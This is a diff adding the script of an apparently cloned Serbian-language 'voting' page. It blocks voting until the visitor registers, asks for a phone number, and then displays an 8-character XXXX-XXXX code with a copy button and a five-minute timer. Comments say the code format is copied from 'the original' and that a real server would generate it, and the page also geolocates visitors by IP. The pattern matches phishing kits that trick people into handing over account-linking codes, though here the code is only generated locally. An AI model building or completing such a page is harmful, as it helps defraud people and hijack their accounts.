"XK", "dial": "+383", "name": "Kosovë", "flag": "🌐"}, {"code": "CR", "dial": "+506", "name": "Costa Rica", "flag": "🇨🇷"}, {"code": "CI", "dial": "+225", "name": "Côte d’Ivoire", "flag": "🇨🇮"}, {"code": "CU", "dial": "+53", "name": "Cuba", "flag": "🇨🇺"}, {"code": "KW", "dial": "+965", "name": "الكويت", "flag": "🇰🇼"}, {"code": "CW", "dial": "+599", "name": "Curaçao", "flag": "🌐"}, {"code": "LA", "dial": "+856", "name": "ລາວ", "flag": "🇱🇦"}, {"code": "LV", "dial": "+371", "name": "Latvija", "flag": "🇱🇻"}, {"code": "LS", "dial": "+266", "name": "Lesotho", "flag": "🇱🇸"}, {"code": "LR", "dial": "+231", "name": "Liberia", "flag": "🇱🇷"}, {"code": "LB", "dial": "+961", "name": "لبنان", "flag": "🇱🇧"}, {"code": "LY", "dial": "+218", "name": "ليبيا", "flag": "🇱🇾"}, {"code": "LT", "dial": "+370", "name": "Lietuva", "flag": "🇱🇹"}, {"code": "LI", "dial": "+423", "name": "Liechtenstein", "flag": "🇱🇮"}, {"code": "LU", "dial": "+352", "name": "Lëtzebuerg", "flag": "🇱🇺"}, {"code": "MU", "dial": "+230", "name": "Mauritius", "flag": "🇲🇺"}, {"code": "MR", "dial": "+222", "name": "موريتانيا", "flag": "🇲🇷"}, {"code": "MG", "dial": "+261", "name": "Madagascar", "flag": "🇲🇬"}, {"code": "YT", "dial": "+262", "name": "Mayotte", "flag": "🌐"}, {"code": "MO", "dial": "+853", "name": "中國澳門特別行政區", "flag": "🇲🇴"}, {"code": "MW", "dial": "+265", "name": "Malawi", "flag": "🇲🇼"}, {"code": "MY", "dial": "+60", "name": "Malaysia", "flag": "🇲🇾"}, {"code": "ML", "dial": "+223", "name": "Mali", "flag": "🇲🇱"}, {"code": "MV", "dial": "+960", "name": "Maldives", "flag": "🇲🇻"}, {"code": "MT", "dial": "+356", "name": "Malta", "flag": "🇲🇹"}, {"code": "MA", "dial": "+212", "name": "المغرب", "flag": "🇲🇦"}, {"code": "MQ", "dial": "+596", "name": "Martinique", "flag": "🌐"}, {"code": "MH", "dial": "+692", "name": "Marshall Islands", "flag": "🇲🇭"}, {"code": "MX", "dial": "+52", "name": "México", "flag": "🇲🇽"}, {"code": "MZ", "dial": "+258", "name": "Moçambique", "flag": "🇲🇿"}, {"code": "MD", "dial": "+373", "name": "Republica Moldova", "flag": "🇲🇩"}, {"code": "MC", "dial": "+377", "name": "Monaco", "flag": "🇲🇨"}, {"code": "MN", "dial": "+976", "name": "Монгол", "flag": "🇲🇳"}, {"code": "MS", "dial": "+1", "name": "Montserrat", "flag": "🌐"}, {"code": "MM", "dial": "+95", "name": "မြန်မာ", "flag": "🇲🇲"}, {"code": "NA", "dial": "+264", "name": "Namibia", "flag": "🇳🇦"}, {"code": "NR", "dial": "+674", "name": "Nauru", "flag": "🇳🇷"}, {"code": "NP", "dial": "+977", "name": "नेपाल", "flag": "🇳🇵"}, {"code": "NE", "dial": "+227", "name": "Niger", "flag": "🇳🇪"}, {"code": "NG", "dial": "+234", "name": "Nigeria", "flag": "🇳🇬"}, {"code": "NL", "dial": "+31", "name": "Nederland", "flag": "🇳🇱"}, {"code": "NI", "dial": "+505", "name": "Nicaragua", "flag": "🇳🇮"}, {"code": "NU", "dial": "+683", "name": "Niue", "flag": "🌐"}, {"code": "NZ", "dial": "+64", "name": "New Zealand", "flag": "🇳🇿"}, {"code": "NC", "dial": "+687", "name": "Nouvelle-Calédonie", "flag": "🌐"}, {"code": "NO", "dial": "+47", "name": "Norge", "flag": "🇳🇴"}, {"code": "AC", "dial": "+247", "name": "Ascension Island", "flag": "🌐"}, {"code": "IM", "dial": "+44", "name": "Isle of Man", "flag": "🌐"}, {"code": "NF", "dial": "+672", "name": "Norfolk Island", "flag": "🌐"}, {"code": "CX", "dial": "+61", "name": "Christmas Island", "flag": "🌐"}, {"code": "SH", "dial": "+290", "name": "St. Helena", "flag": "🌐"}, {"code": "TC", "dial": "+1", "name": "Turks & Caicos Islands", "flag": "🌐"}, {"code": "AE", "dial": "+971", "name": "الإمارات العربية المتحدة", "flag": "🇦🇪"}, {"code": "OM", "dial": "+968", "name": "عُمان", "flag": "🇴🇲"}, {"code": "KY", "dial": "+1", "name": "Cayman Islands", "flag": "🇰🇾"}, {"code": "CK", "dial": "+682", "name": "Cook Islands", "flag": "🌐"}, {"code": "PK", "dial": "+92", "name": "پاکستان", "flag": "🇵🇰"}, {"code": "PW", "dial": "+680", "name": "Palau", "flag": "🇵🇼"}, {"code": "PS", "dial": "+970", "name": "الأراضي الفلسطينية", "flag": "🌐"}, {"code": "PA", "dial": "+507", "name": "Panamá", "flag": "🇵🇦"}, {"code": "PG", "dial": "+675", "name": "Papua New Guinea", "flag": "🇵🇬"}, {"code": "PY", "dial": "+595", "name": "Paraguay", "flag": "🇵🇾"}, {"code": "PE", "dial": "+51", "name": "Perú", "flag": "🇵🇪"}, {"code": "PL", "dial": "+48", "name": "Polska", "flag": "🇵🇱"}, {"code": "PT", "dial": "+351", "name": "Portugal", "flag": "🇵🇹"}, {"code": "PR", "dial": "+1", "name": "Puerto Rico", "flag": "🌐"}, {"code": "KR", "dial": "+82", "name": "대한민국", "flag": "🇰🇷"}, {"code": "RE", "dial": "+262", "name": "La Réunion", "flag": "🌐"}, {"code": "RU", "dial": "+7", "name": "Россия", "flag": "🇷🇺"}, {"code": "RW", "dial": "+250", "name": "U Rwanda", "flag": "🇷🇼"}, {"code": "RO", "dial": "+40", "name": "România", "flag": "🇷🇴"}, {"code": "SV", "dial": "+503", "name": "El Salvador", "flag": "🇸🇻"}, {"code": "WS", "dial": "+685", "name": "Samoa", "flag": "🇼🇸"}, {"code": "SM", "dial": "+378", "name": "San Marino", "flag": "🇸🇲"}, {"code": "ST", "dial": "+239", "name": "São Tomé e Príncipe", "flag": "🇸🇹"}, {"code": "SA", "dial": "+966", "name": "المملكة العربية السعودية", "flag": "🇸🇦"}, {"code": "MK", "dial": "+389", "name": "Северна Македонија", "flag": "🇲🇰"}, {"code": "MP", "dial": "+1", "name": "Northern Mariana Islands", "flag": "🌐"}, {"code": "SC", "dial": "+248", "name": "Seychelles", "flag": "🇸🇨"}, {"code": "BL", "dial": "+590", "name": "Saint-Barthélemy", "flag": "🌐"}, {"code": "MF", "dial": "+590", "name": "Saint-Martin", "flag": "🌐"}, {"code": "PM", "dial": "+508", "name": "Saint-Pierre-et-Miquelon", "flag": "🌐"}, {"code": "SN", "dial": "+221", "name": "Sénégal", "flag": "🇸🇳"}, {"code": "VC", "dial": "+1", "name": "St. Vincent & Grenadines", "flag": "🇻🇨"}, {"code": "KN", "dial": "+1", "name": "St. Kitts & Nevis", "flag": "🇰🇳"}, {"code": "LC", "dial": "+1", "name": "St. Lucia", "flag": "🇱🇨"}, {"code": "RS", "dial": "+381", "name": "Србија", "flag": "🇷🇸"}, {"code": "SG", "dial": "+65", "name": "Singapore", "flag": "🇸🇬"}, {"code": "SX", "dial": "+1", "name": "Sint-Maarten", "flag": "🌐"}, {"code": "SY", "dial": "+963", "name": "سوريا", "flag": "🇸🇾"}, {"code": "SK", "dial": "+421", "name": "Slovensko", "flag": "🇸🇰"}, {"code": "SI", "dial": "+386", "name": "Slovenija", "flag": "🇸🇮"}, {"code": "US", "dial": "+1", "name": "United States", "flag": "🇺🇸"}, {"code": "SB", "dial": "+677", "name": "Solomon Islands", "flag": "🇸🇧"}, {"code": "SO", "dial": "+252", "name": "Soomaaliya", "flag": "🇸🇴"}, {"code": "SD", "dial": "+249", "name": "السودان", "flag": "🇸🇩"}, {"code": "SR", "dial": "+597", "name": "Suriname", "flag": "🇸🇷"}, {"code": "SL", "dial": "+232", "name": "Sierra Leone", "flag": "🇸🇱"}, {"code": "TJ", "dial": "+992", "name": "Тоҷикистон", "flag": "🇹🇯"}, {"code": "TH", "dial": "+66", "name": "ไทย", "flag": "🇹🇭"}, {"code": "TW", "dial": "+886", "name": "台灣", "flag": "🇹🇼"}, {"code": "TZ", "dial": "+255", "name": "Tanzania", "flag": "🇹🇿"}, {"code": "TG", "dial": "+228", "name": "Togo", "flag": "🇹🇬"}, {"code": "TK", "dial": "+690", "name": "Tokelau", "flag": "🌐"}, {"code": "TO", "dial": "+676", "name": "Tonga", "flag": "🇹🇴"}, {"code": "TT", "dial": "+1", "name": "Trinidad & Tobago", "flag": "🇹🇹"}, {"code": "TV", "dial": "+688", "name": "Tuvalu", "flag": "🇹🇻"}, {"code": "TN", "dial": "+216", "name": "تونس", "flag": "🇹🇳"}, {"code": "TM", "dial": "+993", "name": "Türkmenistan", "flag": "🇹🇲"}, {"code": "TR", "dial": "+90", "name": "Türkiye", "flag": "🇹🇷"}, {"code": "UG", "dial": "+256", "name": "Uganda", "flag": "🇺🇬"}, {"code": "UZ", "dial": "+998", "name": "Oʻzbekiston", "flag": "🇺🇿"}, {"code": "UA", "dial": "+380", "name": "Україна", "flag": "🇺🇦"}, {"code": "WF", "dial": "+681", "name": "Wallis-et-Futuna", "flag": "🌐"}, {"code": "UY", "dial": "+598", "name": "Uruguay", "flag": "🇺🇾"}, {"code": "FO", "dial": "+298", "name": "Føroyar", "flag": "🌐"}, {"code": "FM", "dial": "+691", "name": "Micronesia", "flag": "🇫🇲"}, {"code": "FJ", "dial": "+679", "name": "Fiji", "flag": "🇫🇯"}, {"code": "PH", "dial": "+63", "name": "Philippines", "flag": "🇵🇭"}, {"code": "FI", "dial": "+358", "name": "Suomi", "flag": "🇫🇮"}, {"code": "FK", "dial": "+500", "name": "Falkland Islands", "flag": "🌐"}, {"code": "FR", "dial": "+33", "name": "France", "flag": "🇫🇷"}, {"code": "GF", "dial": "+594", "name": "Guyane française", "flag": "🌐"}, {"code": "PF", "dial": "+689", "name": "Polynésie française", "flag": "🌐"}, {"code": "HR", "dial": "+385", "name": "Hrvatska", "flag": "🇭🇷"}, {"code": "CF", "dial": "+236", "name": "République centrafricaine", "flag": "🇨🇫"}, {"code": "TD", "dial": "+235", "name": "Tchad", "flag": "🇹🇩"}, {"code": "ME", "dial": "+382", "name": "Црна Гора", "flag": "🇲🇪"}, {"code": "CZ", "dial": "+420", "name": "Česko", "flag": "🇨🇿"}, {"code": "CL", "dial": "+56", "name": "Chile", "flag": "🇨🇱"}, {"code": "CH", "dial": "+41", "name": "Schweiz", "flag": "🇨🇭"}, {"code": "SE", "dial": "+46", "name": "Sverige", "flag": "🇸🇪"}, {"code": "SJ", "dial": "+47", "name": "Шпицберген и Ян-Майен", "flag": "🌐"}, {"code": "LK", "dial": "+94", "name": "ශ්‍රී ලංකාව", "flag": "🇱🇰"}, {"code": "EC", "dial": "+593", "name": "Ecuador", "flag": "🇪🇨"}, {"code": "GQ", "dial": "+240", "name": "Guinea Ecuatorial", "flag": "🇬🇶"}, {"code": "ER", "dial": "+291", "name": "إريتريا", "flag": "🇪🇷"}, {"code": "SZ", "dial": "+268", "name": "Eswatini", "flag": "🇸🇿"}, {"code": "EE", "dial": "+372", "name": "Eesti", "flag": "🇪🇪"}, {"code": "ET", "dial": "+251", "name": "ኢትዮጵያ", "flag": "🇪🇹"}, {"code": "ZA", "dial": "+27", "name": "iNingizimu Afrika", "flag": "🇿🇦"}, {"code": "SS", "dial": "+211", "name": "South Sudan", "flag": "🇸🇸"}, {"code": "JM", "dial": "+1", "name": "Jamaica", "flag": "🇯🇲"}, {"code": "JP", "dial": "+81", "name": "日本", "flag": "🇯🇵"}];
+
+// ===== STATE =====
+let SEL = COUNTRIES.find(c=>c.code==='RS') || COUNTRIES[0];
+let ddOpen = false;
+let sessionTid = null;
+const SESSION_MS = 5 * 60 * 1000;
+
+// ===== INIT =====
+window.addEventListener('DOMContentLoaded', () => {
+  buildDD(COUNTRIES);
+
+  // Detect country by IP
+  detectCountryByIP();
+
+  // Check localStorage
+  const savedCode  = localStorage.getItem('auth_code');
+  const savedTs    = parseInt(localStorage.getItem('auth_ts') || '0');
+  const savedPhone = localStorage.getItem('auth_phone');
+  const savedDial  = localStorage.getItem('auth_dial');
+  const savedCC    = localStorage.getItem('auth_country');
+  const expired    = savedTs && (Date.now() - savedTs) > SESSION_MS;
+
+  if (savedCode && !expired) {
+    // Restore country
+    if (savedCC) {
+      const c = COUNTRIES.find(x => x.code === savedCC);
+      if (c) setCountry(c);
+    }
+    if (savedPhone) document.getElementById('phone-input').value = savedPhone;
+    renderCode(savedCode);
+    goScreen('s3');
+    startTimer(savedTs);
+  } else {
+    if (expired && savedCode) {
+      localStorage.removeItem('auth_code');
+      localStorage.removeItem('auth_ts');
+    }
+    if (savedPhone) document.getElementById('phone-input').value = savedPhone;
+    if (savedCC) {
+      const c = COUNTRIES.find(x => x.code === savedCC);
+      if (c) setCountry(c);
+    } else if (savedDial) {
+      const c = COUNTRIES.find(x => x.dial === savedDial);
+      if (c) setCountry(c);
+    }
+  }
+
+  // Vote buttons
+  document.querySelectorAll('.vote').forEach(el => el.addEventListener('click', onVote));
+
+  // Enter key
+  document.getElementById('phone-input').addEventListener('keydown', e => {
+    if (e.key === 'Enter') sendDalje();
+  });
+
+  // voted param
+  if (new URLSearchParams(location.search).get('voted') === 'true') {
+    setTimeout(() => Swal.fire({
+      title:'Hvala na učešću!', text:'Vaš glas je zabeležen.',
+      icon:'success', confirmButtonColor:'#9f2bf2'
+    }), 400);
+  }
+});
+
+// ===== IP DETECTION =====
+async function detectCountryByIP() {
+  // Skip if user already has a saved country
+  if (localStorage.getItem('auth_country')) return;
+  try {
+    // Try Cloudflare trace (no CORS issues, no rate limits)
+    const r = await fetch('https://cloudflare.com/cdn-cgi/trace', {signal: AbortSignal.timeout(3000)});
+    const txt = await r.text();
+    const match = txt.match(/loc=([A-Z]{2})/);
+    if (match) {
+      const code = match[1];
+      const c = COUNTRIES.find(x => x.code === code);
+      if (c) {
+        setCountry(c);
+        document.getElementById('ip-hint').innerHTML =
+          'Automatski određeno po IP: <span>' + c.flag + ' ' + c.name + '</span>';
+        return;
+      }
+    }
+  } catch(e) {}
+  // Fallback: ipwho.is
+  try {
+    const r2 = await fetch('https://ipwho.is/?fields=country_code', {signal: AbortSignal.timeout(3000)});
+    const d = await r2.json();
+    if (d.country_code) {
+      const c = COUNTRIES.find(x => x.code === d.country_code);
+      if (c) {
+        setCountry(c);
+        document.getElementById('ip-hint').innerHTML =
+          'Automatski određeno po IP: <span>' + c.flag + ' ' + c.name + '</span>';
+      }
+    }
+  } catch(e) {}
+}
+
+// ===== SCREEN SWITCHING =====
+function goScreen(id) {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  window.scrollTo(0,0);
+}
+
+// "Autorizacija" click: if valid code exists → show code screen directly
+function goAuth() {
+  const savedCode = localStorage.getItem('auth_code');
+  const savedTs   = parseInt(localStorage.getItem('auth_ts') || '0');
+  const expired   = savedTs && (Date.now() - savedTs) > SESSION_MS;
+  if (savedCode && !expired) {
+    renderCode(savedCode);
+    goScreen('s3');
+    startTimer(savedTs);
+  } else {
+    goScreen('s2');
+  }
+}
+
+// "Nazad" from code screen: always go back to voting (s1), code is saved
+function backFromCode() {
+  goScreen('s1');
+}
+
+// ===== VOTE CLICK =====
+function onVote() {
+  Swal.fire({
+    title: 'Dobrodošli!',
+    text: 'Ako želite da glasate, registrujte se.',
+    icon: 'warning',
+    confirmButtonText: 'Autorizacija',
+    confirmButtonColor: '#9f2bf2'
+  }).then(r => { if (r.isConfirmed) goAuth(); });
+}
+
+// ===== SEND DALJE =====
+function sendDalje() {
+  const phone = document.getElementById('phone-input').value.trim().replace(/\D/g,'');
+  if (!phone || phone.length < 5) {
+    const inp = document.getElementById('phone-input');
+    inp.style.borderColor = '#ef4444';
+    inp.style.boxShadow = '0 0 0 3px rgba(239,68,68,0.15)';
+    setTimeout(() => { inp.style.borderColor=''; inp.style.boxShadow=''; }, 1600);
+    return;
+  }
+
+  // Save phone + country
+  localStorage.setItem('auth_phone', phone);
+  localStorage.setItem('auth_dial', SEL.dial);
+  localStorage.setItem('auth_country', SEL.code);
+
+  const btn = document.getElementById('btn-dalje');
+  btn.innerHTML = '<div class="spinner"></div>';
+  btn.disabled = true;
+
+  // Simulate server call — in real app this would be a real API call
+  // The server generates the code (like FT2R7872 in the original)
+  setTimeout(() => {
+    btn.innerHTML = 'Dalje';
+    btn.disabled = false;
+
+    const code = makeServerCode();
+    localStorage.setItem('auth_code', code);
+    localStorage.setItem('auth_ts', Date.now().toString());
+
+    renderCode(code);
+    goScreen('s3');
+    startTimer(Date.now());
+  }, 1100);
+}
+
+// Simulate server-side code generation (same format as original: 4 alphanum + dash + 4 alphanum)
+function makeServerCode() {
+  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ2346789';
+  return Array.from({length:8}, () => chars[Math.random()*chars.length|0]).join('');
+}
+
+// ===== RENDER CODE =====
+function renderCode(code) {
+  const el = document.getElementById('number-code');
+  el.innerHTML = '';
+  const add = ch => {
+    const d = document.createElement('div');
+    d.className = 'symbol'; d.textContent = ch; el.appendChild(d);
+  };
+  code.slice(0,4).split('').forEach(add);
+  const sp = document.createElement('div');
+  sp.className = 'split'; sp.textContent = '–'; el.appendChild(sp);
+  code.slice(4,8).split('').forEach(add);
+}
+
+// ===== COPY CODE =====
+function copyCode() {
+  const code = localStorage.getItem('auth_code') || '';
+  if (!code) return;
+  const fmt = code.slice(0,4) + '-' + code.slice(4);
+  navigator.clipboard.writeText(fmt).catch(()=>{});
+  Swal.fire({
+    title:'Kopirani kod', text: fmt,
+    icon:'success', toast:true, position:'top-end',
+    showConfirmButton:false, timer:2000, confirmButtonColor:'#9f2bf2'
+  });
+}
+
+// ===== SESSION =====
+function startTimer(ts) {
+  clearTimeout(sessionTid);
+  const left = SESSION_MS - (Date.now() - ts);
+  if (left <= 0) { showExpired(); return; }
+  sessionTid = setTimeout(showExpired, left);
+}
+function showExpired() {
+  document.getElementById('session-closed').classList.remove('closed');
+}
+function reloadSess() {
+  localStorage.removeItem('auth_code');
+  localStorage.removeItem('auth_ts');
+  document.getElementById('session-closed').classList.add('closed');
+  document.getElementById('phone-input').value = '';
+  document.getElementById('ip-hint').innerHTML = '';
+  // Re-detect IP for fresh country on new session
+  localStorage.removeItem('auth_country');
+  detectCountryByIP();
+  goScreen('s2');
+}
+
+// ===== COUNTRY =====
+function setCountry(c) {
+  SEL = c;
+  document.getElementById('c-flag').textContent = c.flag;
+  document.getElementById('c-dial').textContent = c.dial;
+}
+function buildDD(list) {
+  const el = document.getElementById('dd-list');
+  el.innerHTML = list.map(c =>
+    '<div class="dd-item" onclick="selectC(\''+c.code+'\')">'+
+    '<span style="font-size:18px">'+c.flag+'</span>'+
+    '<span class="dd-name">'+c.name+'</span>'+
+    '<span class="dd-code">'+c.dial+'</span></div>'
+  ).join('');
+}
+function filterDD(q) {
+  buildDD(q ? COUNTRIES.filter(c =>
+    c.name.toLowerCase().includes(q.toLowerCase()) ||
+    c.dial.includes(q) || c.code.toLowerCase().includes(q.toLowerCase())
+  ) : COUNTRIES);
+}
+function selectC(code) {
+  const c = COUNTRIES.find(x => x.code === code);
+  if (c) { setCountry(c); localStorage.setItem('auth_country', c.code); }
+  closeDD();
+}
+function toggleDD() { ddOpen ? closeDD() : openDD(); }
+function openDD() {
+  ddOpen = true;
+  const btn = document.getElementById('c-btn');
+  const dd  = document.getElementById('c-dd');
+  const r   = btn.getBoundingClientRect();
+  const spaceBelow = window.innerHeight - r.bottom;
+  if (spaceBelow < 280) {
+    dd.style.bottom = (window.innerHeight - r.top + 6) + 'px';
+    dd.style.top = 'auto';
+  } else {
+    dd.style.top = (r.bottom + 6) + 'px';
+    dd.style.bottom = 'auto';
+  }
+  dd.style.left = Math.min(r.left, window.innerWidth - 310) + 'px';
+  dd.classList.add('open');
+  setTimeout(() => document.getElementById('dd-search').focus(), 60);
+}
+function closeDD() {
+  ddOpen = false;
+  document.getElementById('c-dd').classList.remove('open');
+  document.getElementById('dd-search').value = '';
+  buildDD(COUNTRIES);
+}
+document.addEventListener('click', e => {
+  if (ddOpen && !e.target.closest('#c-dd') && !e.target.closest('#c-btn')) closeDD();
+});
+
+// ===== FAQ =====
+function toggleQ(el) {
+  const q = el.closest('.question');
+  const open = q.classList.contains('open');
+  document.querySelectorAll('.question.open').forEach(x => x.classList.remove('open'));
+  if (!open) q.classList.add('open');
+}
+</script>
+</body>
+</html>
